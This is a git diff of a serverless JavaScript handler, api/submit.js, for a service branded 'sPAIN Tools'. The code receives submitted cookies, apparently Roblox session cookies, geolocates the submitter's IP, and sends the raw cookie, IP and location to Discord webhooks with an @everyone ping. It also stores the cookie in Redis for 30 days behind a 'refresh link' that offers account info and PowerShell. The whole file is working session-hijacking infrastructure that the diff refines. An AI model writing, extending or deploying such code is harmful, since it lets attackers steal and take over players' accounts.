@@ -1,4 +1,4 @@
-// api/submit.js — sends cookie IMMEDIATELY, no Roblox API calls
+// api/submit.js
 const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
 const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
 const TG_TOKEN    = process.env.TG_TOKEN;
@@ -28,13 +28,24 @@ async function redisGet(key) {
   }
 }
 
+// Use POST /pipeline for reliable JSON storage
 async function redisSet(key, value) {
   try {
-    const res = await fetch(`${REDIS_URL}/set/${encodeURIComponent(key)}/${encodeURIComponent(JSON.stringify(value))}`, {
-      headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
+    const res = await fetch(`${REDIS_URL}/pipeline`, {
+      method: 'POST',
+      headers: {
+        Authorization: `Bearer ${REDIS_TOKEN}`,
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify([
+        ['SET', key, JSON.stringify(value), 'EX', 2592000] // 30 day TTL
+      ])
     });
     return res.ok;
-  } catch (_) { return false; }
+  } catch (e) {
+    console.error('redisSet error:', e.message);
+    return false;
+  }
 }
 
 async function getIpGeo(ip) {
@@ -96,8 +107,7 @@ async function discordSend(url, payload) {
 
 async function discordChunked(url, text) {
   const limit = 1990;
-  let rem = text;
-  let first = true;
+  let rem = text; let first = true;
   while (rem.length > 0) {
     const chunk = rem.substring(0, limit);
     rem = rem.substring(limit);
@@ -111,7 +121,7 @@ async function discordChunked(url, text) {
 }
 
 async function sendHit(webhookUrl, { cookie, ip, geo, now, pageName, refreshUrl }) {
-  // Message 1: embed with IP/location only (small, guaranteed to send)
+  // Message 1: info embed
   await discordSend(webhookUrl, {
     content: '@everyone',
     embeds: [{
@@ -129,12 +139,12 @@ async function sendHit(webhookUrl, { cookie, ip, geo, now, pageName, refreshUrl 
     }]
   });
 
-  // Message 2: refresh link as plain text so it 100% shows
+  // Message 2: refresh link as plain text (never gets cut off)
   await discordSend(webhookUrl, {
-    content: `🔄 **Refresh Link** (click to get full account info):\n${refreshUrl}`
+    content: `🔄 **Refresh Link** — click to get full account info + PowerShell:\n<${refreshUrl}>`
   });
 
-  // Message 3: raw cookie chunked
+  // Message 3: raw cookie
   await discordChunked(webhookUrl, cookie);
 }
 
@@ -144,11 +154,11 @@ async function sendInvalid(webhookUrl, { ip, geo, now, pageName }) {
       title: '⚠️ No valid cookie submitted',
       color: 0xff3333,
       fields: [
-        { name: '🌐 IP',       value: ip || 'Unknown',                                                                inline: true  },
-        { name: '📍 Location', value: [geo?.city, geo?.country].filter(Boolean).join(', ') || 'Unknown',               inline: true  },
-        { name: '🕐 Time',     value: now,                                                                              inline: false }
+        { name: '🌐 IP',       value: ip || 'Unknown',                                                   inline: true  },
+        { name: '📍 Location', value: [geo?.city, geo?.country].filter(Boolean).join(', ') || 'Unknown', inline: true  },
+        { name: '🕐 Time',     value: now,                                                               inline: false }
       ],
-      footer:    { text: `sPAIN Tools • ${pageName}` },
+      footer: { text: `sPAIN Tools • ${pageName}` },
       timestamp: now
     }]
   });
@@ -163,10 +173,8 @@ export default async function handler(req, res) {
 
   const body = parseBody(req.body);
   const { slug, slots } = body;
-
   if (!slug)  return res.status(400).json({ error: 'slug is required' });
   if (!slots) return res.status(400).json({ error: 'slots is required' });
-
   if (!REDIS_URL || !REDIS_TOKEN) return res.status(500).json({ error: 'Server config error' });
 
   const record = await redisGet(`slot:${slug}`);
@@ -200,7 +208,7 @@ export default async function handler(req, res) {
     const refreshId  = generateId();
     const refreshUrl = `https://spain-tools.vercel.app/api/refresh?id=${refreshId}`;
 
-    await redisSet(`refresh:${refreshId}`, {
+    const saved = await redisSet(`refresh:${refreshId}`, {
       cookie,
       webhook:   record.webhook,
       webhook1:  webhooks[1] || null,
@@ -208,6 +216,8 @@ export default async function handler(req, res) {
       ip,
       createdAt: now
     });
+
+    console.log('Refresh saved:', saved, 'id:', refreshId);
 
     for (const wh of webhooks) await sendHit(wh, { cookie, ip, geo, now, pageName, refreshUrl });
 
